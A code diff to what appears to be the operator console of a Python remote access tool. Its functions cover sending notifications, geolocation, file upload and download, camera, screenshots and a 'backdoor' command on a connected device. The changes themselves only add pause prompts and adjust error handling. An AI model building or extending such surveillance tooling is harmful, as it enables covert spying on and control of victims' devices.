@@ -27,6 +27,8 @@ def send_notification(conn, address):
                 json_send(conn, {"title":title, "message":message, "app":app})
             except Exception as e:
                 print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
+                input("OK")
+            
             break
         elif command == "9": break
     
@@ -43,7 +45,9 @@ def json_send(conn, data):
     try:
         json_data = simplejson.dumps(data)
         send_data(conn, json_data.encode("utf-8"))
-    except Exception as e: print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
+    except Exception as e: 
+        input("OK")
+        print(Fore.LIGHTRED_EX + f'[!] Error: {e}')
 
 def geo(conn, address):
     send_data(conn, b"MODE_GEO")
@@ -115,6 +119,7 @@ def upload(conn, address, path=None, name=None):
         print(Fore.LIGHTCYAN_EX + "[+] File Uploaded")
     except Exception as error:
         print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
+        input("OK")
     input("OK")
     
 def download(conn, address):
@@ -130,6 +135,7 @@ def download(conn, address):
             f.write(data)
     except Exception as error: 
         print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
+        input("OK")
     input("OK")
 
 def cam(conn, address):
@@ -151,7 +157,9 @@ def screenshot(conn, address):
         with open(f"photos/screenshot{number}.jpg", "wb") as f:
             f.write(data)
         print(Fore.LIGHTCYAN_EX + f"[+] Screenshot: photos/screenshot{number}.jpg")
-    except: print(Exception)
+    except Exception as e: 
+        print(e)
+        input("OK")
     input("OK")
 
 def backdoor(conn, address):
